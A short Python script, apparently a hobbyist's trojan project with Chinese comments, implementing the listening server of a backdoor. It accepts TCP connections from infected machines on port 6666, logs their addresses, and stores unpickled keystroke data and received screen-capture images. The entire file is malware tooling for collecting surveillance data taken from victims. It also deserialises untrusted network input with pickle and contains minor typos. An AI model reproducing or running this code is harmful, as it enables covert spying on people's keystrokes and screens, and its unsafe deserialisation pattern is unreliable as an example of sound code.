# Author:成为F
# -*- codeing = utff-8 -*-
# @Time : 2020/12/1 15:04
# @Author : 成为F
# @File : 木马.py
# @Software : PyCharm
import pickle   #按键代码
from io import BytesIO  #录屏
import socket   #tcp协议

# 首先写出后门   接收数据
def Sevver_PIC(ip,port):      #ip地址和端口号
    socket_obj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    #创建新的套接字,这个套接字用来链接
    #绑定本机地址让木马程序找到后门和传送数据
    socket_obj.bind((ip,port))
    #需要让后门程序等待后面链接
    socket_obj.listen(5)

    file_on = 1
    #循环等待连接木马
    while True:
        #接收tcp链接
        connection,address = socket_obj.accept()    #创建新的套接字,这个套接字用来发送
        #打印木马程序电脑的IP地址和端口
        print('server connection by:',address)
        #预先定义接收信息的变量
        recieved_message = b''
        recieved_message_fragment = connection.recv(1024)
        while recieved_message_fragment:
            recieved_message += recieved_message_fragment
            recieved_message_fragment = connection.recv(1024)

        #io操作异常处理
        try:
            obj = pickle.loads(recieved_message)
            print(obj)
        except EOFError:
            file_name = 'recv_image_' + str(file_on) + '.bmg'
            recv_image = open(file_name,'wb')
            recv_image.write(recieved_message)
            file_on +=1
        connection.close()

if __name__ == '__main__':
    Server_IP = '0.0.0.0'
    Server_Port = 6666
    Sevver_PIC(Server_IP,Server_Port)















